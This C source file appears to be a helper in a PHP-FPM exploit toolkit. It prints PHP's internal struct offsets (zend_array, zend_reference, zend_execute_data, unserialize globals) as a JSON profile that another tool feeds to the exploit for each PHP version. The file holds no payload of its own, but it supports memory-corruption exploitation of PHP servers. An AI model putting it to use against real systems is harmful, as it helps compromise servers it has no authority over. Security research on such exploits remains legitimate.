/* php2shell_fpm_offsets.c — print the layout offsets the exploit needs.
 *
 * Compiled against the headers of a PHP build (the user prefix installed by
 * lab/fpm/build_php.sh) so every PHP version reports its own geometry:
 *
 *   gcc -o offsets php2shell_fpm_offsets.c \
 *       -I$prefix/include/php -I$prefix/include/php/main \
 *       -I$prefix/include/php/Zend -I$prefix/include/php/TSRM \
 *       -I$prefix/include/php/ext -I$prefix/include/php/ext/date/lib
 *
 * The output is a JSON object consumed by tools/php2shell_fpm_profile.py.
 * Nothing here is version specific: the struct layouts moved between PHP
 * releases (zend_array::arData and pDestructor in particular), so the
 * offsets are read from the headers instead of being hardcoded.
 */

#define _GNU_SOURCE

#include <stddef.h>
#include <stdio.h>

#include "php.h"
#include "ext/standard/basic_functions.h"

int main(void)
{
    printf("{\n");
    printf("  \"bg\": {\"unserialize_data\": %zu, \"unserialize_level\": %zu},\n",
           offsetof(php_basic_globals, unserialize.data),
           offsetof(php_basic_globals, unserialize.level));
    printf("  \"zval\": {\"value\": %zu, \"type_info\": %zu, \"context\": %zu, "
           "\"size\": %zu},\n",
           offsetof(zval, value), offsetof(zval, u1), offsetof(zval, u2),
           sizeof(zval));
    printf("  \"zend_array\": {\"gc\": %zu, \"flags\": %zu, \"nTableMask\": %zu, "
           "\"arData\": %zu, \"nNumUsed\": %zu, \"nNumOfElements\": %zu, "
           "\"nTableSize\": %zu, \"pDestructor\": %zu},\n",
           offsetof(zend_array, gc), offsetof(zend_array, u),
           offsetof(zend_array, nTableMask), offsetof(zend_array, arData),
           offsetof(zend_array, nNumUsed), offsetof(zend_array, nNumOfElements),
           offsetof(zend_array, nTableSize), offsetof(zend_array, pDestructor));
    /* zend_reference::sources only exists from PHP 7.3 on (weak references);
     * on 7.0-7.2 the reference ends after "val" and the exploit never writes
     * past it, so the profile records it as null. */
#if PHP_VERSION_ID >= 70300
    printf("  \"zend_reference\": {\"gc\": %zu, \"val\": %zu, \"val_type_info\": %zu, "
           "\"sources\": %zu},\n",
           offsetof(zend_reference, gc), offsetof(zend_reference, val),
           offsetof(zend_reference, val.u1),
           offsetof(zend_reference, sources));
#else
    printf("  \"zend_reference\": {\"gc\": %zu, \"val\": %zu, \"val_type_info\": %zu, "
           "\"sources\": null},\n",
           offsetof(zend_reference, gc), offsetof(zend_reference, val),
           offsetof(zend_reference, val.u1));
#endif
    printf("  \"zend_string\": {\"gc\": %zu, \"h\": %zu, \"len\": %zu, \"val\": %zu},\n",
           offsetof(zend_string, gc), offsetof(zend_string, h),
           offsetof(zend_string, len), offsetof(zend_string, val));
    printf("  \"zend_execute_data\": {\"opline\": %zu, \"call\": %zu, "
           "\"return_value\": %zu, \"func\": %zu, \"num_args\": %zu, \"arg1\": %zu},\n",
           offsetof(zend_execute_data, opline), offsetof(zend_execute_data, call),
           offsetof(zend_execute_data, return_value),
           offsetof(zend_execute_data, func),
           offsetof(zend_execute_data, This) + offsetof(zval, u2),
           (size_t) ZEND_CALL_FRAME_SLOT * sizeof(zval));
    printf("  \"bucket\": {\"val\": %zu, \"h\": %zu, \"key\": %zu},\n",
           offsetof(Bucket, val), offsetof(Bucket, h), offsetof(Bucket, key));
    printf("  \"zend_function\": {\"num_args\": %zu}\n",
           offsetof(zend_function, common.num_args));
    printf("}\n");
    return 0;
}
